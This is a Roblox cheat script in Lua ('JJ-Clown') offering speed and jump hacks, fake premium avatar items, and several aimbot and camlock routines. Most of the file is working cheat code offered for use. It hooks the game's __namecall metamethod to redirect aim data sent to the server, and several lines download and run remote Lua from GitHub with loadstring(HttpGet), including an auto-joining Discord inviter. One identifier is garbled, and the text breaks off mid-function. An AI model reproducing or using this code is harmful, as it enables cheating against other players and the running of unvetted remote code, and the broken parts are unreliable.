-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- NOT ALL THESE SCRIPTS ARE MINE                                                    -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- TO THE CREATORS THAT ARE USING THIS SCRIPT AND FOUND YOUR SCRIPTS                 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- YOU HAVE FULL ACCESS FOR IT JUST DM ME IF YOU WANT ME TO REMOVE IT spidermanw#5844-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-- NOT ALL THESE SCRIPTS ARE MINE
-- TO THE CREATORS THAT ARE USING THIS SCRIPT AND FOUND YOUR SCRIPTS
-- YOU HAVE FULL ACCESS FOR IT JUST DM ME IF YOU WANT ME TO REMOVE IT spidermanw#5844
game.StarterGui:SetCore("SendNotification",  {
    Title = "JJ-CLOWN";
     Text = "succesfully loaded";
     Icon = "rbxassetid://12425573231";
     Duration = 7;
     Button1 = "Close";
     Callback = NotificationBindable;
    })
     
    local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
 
    Module.Prompt({ invite = "https://discord.gg/YyVb8X9CDA", name = "jj-clown" }) -- name is optional
    
    Module.Join("https://discord.gg/YyVb8X9CDA")
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("JJ-Clown", "LightTheme")
 
-- Local Player
local Player = Window:NewTab("Local Player")
local PlayerSection = Player:NewSection("The starting 3 scripts dont work in dh")

PlayerSection:NewSlider("Walk Scale", "Walk Fast!!", 2500, 0, function(s) -- 2500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

PlayerSection:NewSlider("Jump Scale", "Jump High!!", 1000, 0, function(s) -- 350 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

PlayerSection:NewButton("Reset WS/JP", "Reset Scales", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
end)

local PlayerSection = Player:NewSection("Customize Avatar")

PlayerSection:NewButton("Remove Headless script", "No Headless", function()
	game.Players.LocalPlayer.Character.Head.Transparency = 0
	game.Players.LocalPlayer.Character.Head.Transparency = 0
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if (v:IsA("Decal")) then
			v.Transparency = 0
		end
	end
end)

PlayerSection:NewButton("Put on Headless script", "Free Headless", function()
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
		if (v:IsA("Decal")) then
			v.Transparency = 1
		end
	end
end)

PlayerSection:NewButton("Free Korblox script", "Free korblox", function()
	local ply = game.Players.LocalPlayer
	local chr = ply.Character
	chr.RightLowerLeg.MeshId = "902942093"
	chr.RightLowerLeg.Transparency = "1"
	chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
	chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
	chr.RightFoot.MeshId = "902942089"
	chr.RightFoot.Transparency = "1"
end)

 -- Lock
 local Lock = Window:NewTab("Lock")
 local LockSection = Lock:NewSection("Lock")
 
 LockSection:NewButton("Universal AimBot (NOT MINE)", "red wires script", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RedWirePlatinumTwo/RobloxScripts/main/Aimbot.lua"))()
 end)
 
 
 LockSection:NewButton("No recoil", "No recoil  :000000", function()
     local CurrentFocus = game:GetService("Workspace").CurrentCamera.CFrame
     game:GetService("Workspace").CurrentCamera:Destroy()
     local Instance = Instance.new("Camera", game:GetService("Workspace"))
     Instance.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
     Instance.CameraType = Enum.CameraType.Custom
     Instance.CFrame = CurrentFocus
 end)

 LockSection:NewButton("Q CamLock", "Q To toggle and untoggle", function()
    getgenv().OldAimPart = "UpperTorso"
    getgenv().AimPart = "UpperTorso" -- For R15 Games: {UpperTorso, LowerTorso, HumanoidRootPart, Head} | For R6 Games: {Head, Torso, HumanoidRootPart}  
        getgenv().AimlockKey = "q"
        getgenv().AimRadius = 30 -- How far away from someones character you want to lock on at
        getgenv().ThirdPerson = true 
        getgenv().FirstPerson = true
        getgenv().TeamCheck = false -- Check if Target is on your Team (True means it wont lock onto your teamates, false is vice versa) (Set it to false if there are no teams)
        getgenv().PredictMovement = true -- Predicts if they are moving in fast velocity (like jumping) so the aimbot will go a bit faster to match their speed 
        getgenv().PredictionVelocity = 6.1
        getgenv().CheckIfJumped = true
        getgenv().Smoothness = true
        getgenv().SmoothnessAmount = 0.0369
    
        local Players, Uis, RService, SGui = game:GetService"Players", game:GetService"UserInputService", game:GetService"RunService", game:GetService"StarterGui";
        local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
        local Aimlock, MousePressed, CanNotify = true, false, false;
        local AimlockTarget;
        local OldPre;
        
    
        
        getgenv().WorldToViewportPoint = function(P)
            return Camera:WorldToViewportPoint(P)
        end
        
        getgenv().WorldToScreenPoint = function(P)
            return Camera.WorldToScreenPoint(Camera, P)
        end
        
        getgenv().GetObscuringObjects = function(T)
            if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild("Head") then 
                local RayPos = workspace:FindPartOnRay(RNew(
                    T[getgenv().AimPart].Position, Client.Character.Head.Position)
                )
                if RayPos then return RayPos:IsDescendantOf(T) end
            end
        end
        
        getgenv().GetNearestTarget = function()
            -- Credits to whoever made this, i didnt make it, and my own mouse2plr function kinda sucks
            local players = {}
            local PLAYER_HOLD  = {}
            local DISTANCES = {}
            for i, v in pairs(Players:GetPlayers()) do
                if v ~= Client then
                    table.insert(players, v)
                end
            end
            for i, v in pairs(players) do
                if v.Character ~= nil then
                    local AIM = v.Character:FindFirstChild("Head")
                    if getgenv().TeamCheck == true and v.Team ~= Client.Team then
                        local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                        local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                        local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                        local DIFF = math.floor((POS - AIM.Position).magnitude)
                        PLAYER_HOLD[v.Name .. i] = {}
                        PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                        PLAYER_HOLD[v.Name .. i].plr = v
                        PLAYER_HOLD[v.Name .. i].diff = DIFF
                        table.insert(DISTANCES, DIFF)
                    elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
                        local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                        local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                        local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                        local DIFF = math.floor((POS - AIM.Position).magnitude)
                        PLAYER_HOLD[v.Name .. i] = {}
                        PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                        PLAYER_HOLD[v.Name .. i].plr = v
                        PLAYER_HOLD[v.Name .. i].diff = DIFF
                        table.insert(DISTANCES, DIFF)
                    end
                end
            end
            
            if unpack(DISTANCES) == nil then
                return nil
            end
            
            local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
            if L_DISTANCE > getgenv().AimRadius then
                return nil
            end
            
            for i, v in pairs(PLAYER_HOLD) do
                if v.diff == L_DISTANCE then
                    return v.plr
                end
            end
            return nil
        end
        
        Mouse.KeyDown:Connect(function(a)
            if not (Uis:GetFocusedTextBox()) then 
                if a == AimlockKey and AimlockTarget == nil then
                    pcall(function()
                        if MousePressed ~= true then MousePressed = true end 
                        local Target;Target = GetNearestTarget()
                        if Target ~= nil then 
                            AimlockTarget = Target
                        end
                    end)
                elseif a == AimlockKey and AimlockTarget ~= nil then
                    if AimlockTarget ~= nil then AimlockTarget = nil end
                    if MousePressed ~= false then 
                        MousePressed = false 
                    end
                end
            end
        end)
        
        RService.RenderStepped:Connect(function()
            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then 
                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                    CanNotify = true 
                else 
                    CanNotify = false 
                end
            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
                    CanNotify = true 
                else 
                    CanNotify = false 
                end
            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then 
                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                    CanNotify = true 
                else 
                    CanNotify = false 
                end
            end
            if Aimlock == true and MousePressed == true then 
                if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) then 
                    if getgenv().FirstPerson == true then
                        if CanNotify == true then
                            if getgenv().PredictMovement == true then
                                if getgenv().Smoothness == true then
                                    --// The part we're going to lerp/smoothen \\--
                                    local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                                    
                                    --// Making it work \\--
                                    Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                                else
                                    Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                                end
                            elseif getgenv().PredictMovement == false then 
                                if getgenv().Smoothness == true then
                                    --// The part we're going to lerp/smoothen \\--
                                    local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
    
                                    --// Making it work \\--
                                    Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                                else
                                    Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                                end
                            end
                        end
                    end
                end
            end
             if CheckIfJumped == true then
           if AimlockTarget.Character.HuDDDDDDDDDDWmanoid.FloorMaterial == Enum.Material.Air then
        
               getgenv().AimPart = "UpperTorso"
           else
             getgenv().AimPart = getgenv().OldAimPart
    
           end
        end
    end)
end)

 LockSection:NewButton("Green Dot", "X to enable", function()
 
 local Settings = {
     rewrittenmain = {
         Enabled = true,
         Key = "x",
         DOT = true,
         AIRSHOT = true,
         NOTIF = true, 
         AUTOPRED = false, 
         FOV = math.huge,
         RESOVLER = false 
     }
 }
 
 local SelectedPart = "UpperTorso"                              
 local Prediction = true
 local PredictionValue = 0.1259910                            
 
 
     local AnchorCount = 0
     local MaxAnchor = 50
 
     local CC = game:GetService"Workspace".CurrentCamera
     local Plr;
     local enabled = false
     local accomidationfactor = 0.12348
     local mouse = game.Players.LocalPlayer:GetMouse()
     local placemarker = Instance.new("Part", game.Workspace)
 
     function makemarker(Parent, Adornee, Color, Size, Size2)
         local e = Instance.new("BillboardGui", Parent)
         e.Name = "PP"
         e.Adornee = Adornee
         e.Size = UDim2.new(Size, Size2, Size, Size2)
         e.AlwaysOnTop = Settings.rewrittenmain.DOT
         local a = Instance.new("Frame", e)
         if Settings.rewrittenmain.DOT == true then
         a.Size = UDim2.new(2, 2, 2)
         else
         a.Size = UDim2.new(0, 0, 0, 0)
         end
         if Settings.rewrittenmain.DOT == true then
         a.Transparency = 0
         a.BackgroundTransparency = 0
         else
         a.Transparency = 1
         a.BackgroundTransparency = 1
         end
         a.BackgroundColor3 = Color
         local g = Instance.new("UICorner", a)
         if Settings.rewrittenmain.DOT == false then
         g.CornerRadius = UDim.new(0, 0)
         else
         g.CornerRadius = UDim.new(1, 1)
         end
         return(e)
     end
 
     
     local data = game.Players:GetPlayers()
     function noob(player)
         local character
         repeat wait() until player.Character
         local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(68, 214, 44), 0.3, 3)
         handler.Name = player.Name
         player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
 
 
         spawn(function()                                    
             while wait() do                                     
                 if player.Character then                                    
                 end                                    
             end                                     
         end)                                    
     end                                    
 
     for i = 1, #data do
         if data[i] ~= game.Players.LocalPlayer then
             noob(data[i])
         end
     end
 
     game.Players.PlayerAdded:connect(function(Player)
         noob(Player)
     end)
 
     spawn(function()
         placemarker.Anchored = true
         placemarker.CanCollide = false
         if Settings.rewrittenmain.DOT == true then
         placemarker.Size = Vector3.new(6, 6, 6)
         else
         placemarker.Size = Vector3.new(0, 0, 0)
         end
         placemarker.Transparency = 1
         if Settings.rewrittenmain.DOT then
         makemarker(placemarker, placemarker, Color3.fromRGB(68, 214, 44), 0.40, 0)
         end
     end)
 
     game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
         if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
             if enabled == true then
                 enabled = false
                 if Settings.rewrittenmain.NOTIF == true then
                     Plr = getClosestPlayerToCursor()
                 game.StarterGui:SetCore("SendNotification", {
                         Title = "Lock Notification",
                         Text = "Unlocked",
                         Icon = "",
                         Duration = 1,
 })
             end
             else
                 Plr = getClosestPlayerToCursor()
                 enabled = true
                 if Settings.rewrittenmain.NOTIF == true then
 
                     game.StarterGui:SetCore("SendNotification", {
                         Title = "Lock Notification",
                         Text = "Locked On :"..tostring(Plr.Name); 
                         Icon = "",
                         Duration = 1,
 })
 
                 end
             end
         end
     end)
 
 
 
     function getClosestPlayerToCursor()
         local closestPlayer
         local shortestDistance = Settings.rewrittenmain.FOV
 
         for i, v in pairs(game.Players:GetPlayers()) do
             if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                 local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                 local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                 if magnitude < shortestDistance then
                     closestPlayer = v
                     shortestDistance = magnitude
                 end
             end
         end
         return closestPlayer
     end
 
     local pingvalue = nil;
     local split = nil;
     local ping = nil;
 
     game:GetService"RunService".Stepped:connect(function()
         if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
             placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
         else
             placemarker.CFrame = CFrame.new(0, 9999, 0)
         end
         if Settings.rewrittenmain.AUTOPRED == true then
              pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
              split = string.split(pingvalue,'(')
              ping = tonumber(split[1])
             if ping < 130 then
                 PredictionValue = 0.151
             elseif ping < 125 then
                 PredictionValue = 0.149
             elseif ping < 110 then
                 PredictionValue = 0.146
             elseif ping < 105 then
                 PredictionValue = 0.138
             elseif ping < 90 then
                 PredictionValue = 0.136
             elseif ping < 80 then
                 PredictionValue = 0.134
             elseif ping < 70 then
                 PredictionValue = 0.131
             elseif ping < 60 then
                 PredictionValue = 0.1229
             elseif ping < 50 then
                 PredictionValue = 0.1225
             elseif ping < 40 then
                 PredictionValue = 0.1256
             end
         end
     end)
 
     local mt = getrawmetatable(game)
     local old = mt.__namecall
     setreadonly(mt, false)
     mt.__namecall = newcclosure(function(...)
         local args = {...}
         if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
 
             -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
             --[[
             if Settings.rewrittenmain.AIRSHOT == true then
                 if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
                     
                     --// Airshot
                     args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
                 else
                     args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
                 end
             else
                     args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
             end
             ]]
             if Prediction == true then
                 
             args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
 
             else
 
             args[3] = Plr.Character[SelectedPart].Position
 
             end
 
             return old(unpack(args))
         end
         return old(...)
     end)
 
     game:GetService("RunService").RenderStepped:Connect(function()
         if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
         if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
             
             if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
                 
                 --// Airshot
 
                 --// Anchor Check
 
                 if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                     AnchorCount = AnchorCount + 1
                     if AnchorCount >= MaxAnchor then
                         Prediction = false
                         wait(2)
                         AnchorCount = 0;
                     end
                 else
                     Prediction = true
                     AnchorCount = 0;
                 end
 
                 SelectedPart = "HumanoidRootPart"
 
             else
                 --// Anchor Check
 
                 if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                     AnchorCount = AnchorCount + 1
                     if AnchorCount >= MaxAnchor then
                         Prediction = false
                         wait(2)
                         AnchorCount = 0;
                     end
                 else
                     Prediction = true
                     AnchorCount = 0;
                 end
 
                 SelectedPart = "HumanoidRootPart"
 
             end
             else
 
                 --// Anchor Check
 
                 if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                     AnchorCount = AnchorCount + 1
                     if AnchorCount >= MaxAnchor then
                         Prediction = false
                         wait(2)
                         AnchorCount = 0;
                     end
                 else
                     Prediction = true
                     AnchorCount = 0;
                 end
 
                 SelectedPart = "HumanoidRootPart"
             end
 
         else
                 SelectedPart = "HumanoidRootPart"
         end
     end)
 
 --the cam lock
 
 getgenv().Prediction = 0.143105125985120958176	
 getgenv().AimPart = "UpperTorso"	
 getgenv().Key = "Q"	
 getgenv().DisableKey = "P"	
     
 getgenv().FOV = true	
 getgenv().ShowFOV = false	
 getgenv().FOVSize = 55	
     
 --// Variables (Service)	
     
 local Players = game:GetService("Players")	
 local RS = game:GetService("RunService")	
 local WS = game:GetService("Workspace")	
 local GS = game:GetService("GuiService")	
 local SG = game:GetService("StarterGui")	
     
 --// Variables (regular)	
     
 local LP = Players.LocalPlayer	
 local Mouse = LP:GetMouse()	
 local Camera = WS.CurrentCamera	
 local GetGuiInset = GS.GetGuiInset	
     
 local AimlockState = true	
 local Locked	
 local Victim	
     
 local SelectedKey = getgenv().Key	
 local SelectedDisableKey = getgenv().DisableKey	
         
 --// Check if aimlock is loaded	
     
 if getgenv().Loaded == true then	
     Notify("Aimlock is already loaded!")	
     return	
 end	
     
 getgenv().Loaded = true	
     
 --// FOV Circle	
     
 local fov = Drawing.new("Circle")	
 fov.Filled = false	
 fov.Transparency = 1	
 fov.Thickness = 1	
 fov.Color = Color3.fromRGB(255, 255, 0)	
 fov.NumSides = 1000	
     
 --// Functions	
     
 function update()	
     if getgenv().FOV == true then	
         if fov then	
 fov.Radius = getgenv().FOVSize * 2	
             fov.Visible = getgenv().ShowFOV	
 fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)	
     
             return fov	
         end	
     end	
 end	
     
 function WTVP(arg)	
     return Camera:WorldToViewportPoint(arg)	
 end	
     
 function WTSP(arg)	
     return Camera.WorldToScreenPoint(Camera, arg)	
 end	
     
 function getClosest()	
     local closestPlayer	
     local shortestDistance = math.huge	
     
     for i, v in pairs(game.Players:GetPlayers()) do	
         local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true	
         local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil	
             
 if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then	
             local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)	
 local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude	
                 
             if (getgenv().FOV) then	
                 if (fov.Radius > magnitude and magnitude < shortestDistance) then	
                     closestPlayer = v	
                     shortestDistance = magnitude	
                 end	
             else	
                 if (magnitude < shortestDistance) then	
                     closestPlayer = v	
                     shortestDistance = magnitude	
                 end	
             end	
         end	
     end	
     return closestPlayer	
 end	
     
 --// Checks if key is down	
     
 Mouse.KeyDown:Connect(function(k)	
     SelectedKey = SelectedKey:lower()	
     SelectedDisableKey = SelectedDisableKey:lower()	
     if k == SelectedKey then	
         if AimlockState == true then	
             Locked = not Locked	
             if Locked then	
                 Victim = getClosest()	
     
                 Notify("Locked onto: "..tostring(Victim.Character.Humanoid.DisplayName))	
             else	
                 if Victim ~= nil then	
                     Victim = nil	
     
                     Notify("Unlocked!")	
